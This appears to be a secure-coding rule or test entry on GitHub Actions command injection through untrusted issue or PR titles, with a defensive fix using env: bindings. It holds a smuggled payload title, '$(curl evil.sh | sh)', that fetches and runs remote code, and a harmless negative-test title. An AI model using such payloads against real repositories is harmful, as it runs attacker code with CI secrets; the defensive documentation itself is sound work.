name: GitHub Actions run-command injection via untrusted event input
attack_scenario: an attacker opens an issue or PR titled `$(curl evil.sh | sh)`; the workflow interpolates it directly into a run: command and the CI runner executes it with the repo's secrets and GITHUB_TOKEN
negative_test_hint: open a test issue titled "$(touch /tmp/pwned)" and assert the workflow logs it as inert text instead of executing it

exemplar.explanation: Untrusted github.event.* fields interpolated into run: execute on the runner with CI secrets. Route the value through an env: binding and quote it so it is passed as data, never parsed as shell.
